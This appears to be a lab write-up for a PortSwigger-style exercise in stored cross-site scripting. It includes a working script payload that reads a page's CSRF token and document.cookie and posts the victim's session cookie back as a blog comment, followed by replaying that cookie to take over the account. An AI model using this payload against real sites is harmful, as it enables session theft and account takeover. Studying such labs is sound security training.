# Challenge: Exploiting cross-site scripting to steal cookies
- Category: Web

## Description

## Flag: 


## Solution
Opening the website, it was a blogpage with a login page and comment boxes under each blog post.

To check if XSS attacks work on this website i commented `<script>alert('hmmm')</script>`

<img width="578" height="208" alt="image" src="https://github.com/user-attachments/assets/07299798-dc55-48f1-a055-db8e944b6aa5" />

This confirmed that the website is vulnerable to XSS attacks, since `alert()` created a popup window.

When i sent my comment, using proxy mode on BurpSuite i found

<img width="1318" height="428" alt="image" src="https://github.com/user-attachments/assets/fb4fef24-f6b9-44ea-9ef6-60e460db082a" />

Here the important parts are `Cookie: session=nXyCSGTAzjBOZrIXWrgiGfsvN0TRqEGb` and `csrf=yaei4oLq8uQ74HMVaQcDv5vZAkovjTu3`
Now, i know that the cookie and csrf token can be retrieved from the server so, i used
- `document.getElementsByName('csrf')[0].value` in the browser console returned `yaei4oLq8uQ74HMVaQcDv5vZAkovjTu3` to get the csrf 
- `document.cookie` to get `'session=nXyCSGTAzjBOZrIXWrgiGfsvN0TRqEGb'` to get the cookie.

since i now know how to get the csrf and cookie of the session, i looked for the form element and found
```
<form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
    <input required type="hidden" name="csrf" value="uKBG6nKCcfC7oLo8VvkRbR3pQZXHqupD">
    <input required type="hidden" name="postId" value="7">
    <label>Comment:</label>
    <textarea required rows="12" cols="300" name="comment"></textarea>
            <label>Name:</label>
            <input required type="text" name="name">
            <label>Email:</label>
            <input required type="email" name="email">
            <label>Website:</label>
            <input pattern="(http:|https:).+" type="text" name="website">
    <button class="button" type="submit">Post Comment</button>
</form>
```
Based on this, i made my own payload
```
<script>
window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', document.cookie);
data.append('name', 'hhhh');
data.append('email', 'hhh@email.com');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});

});
</script>
```
This got me the csrf and cookie 

<img width="545" height="128" alt="image" src="https://github.com/user-attachments/assets/477a46a6-db81-4c92-9f4e-6897f2d744da" />

Now, i opened the `my-account` page in BurpSuite on repeater mode and added `Cookie: session=91jTtW8EzZmtQ5SQHLEHcpUX5vrm1WdH` to the request and solved the challenge.

<img width="719" height="367" alt="image" src="https://github.com/user-attachments/assets/a1f122f5-7729-457e-9242-15039b74ae98" />

<img width="1780" height="645" alt="image" src="https://github.com/user-attachments/assets/a67bd274-9871-4c98-8966-c1deca117811" />

## References
- https://portswigger.net/web-security/csrf
- https://portswigger.net/web-security/cross-site-scripting
- https://owasp.org/www-community/attacks/xss/
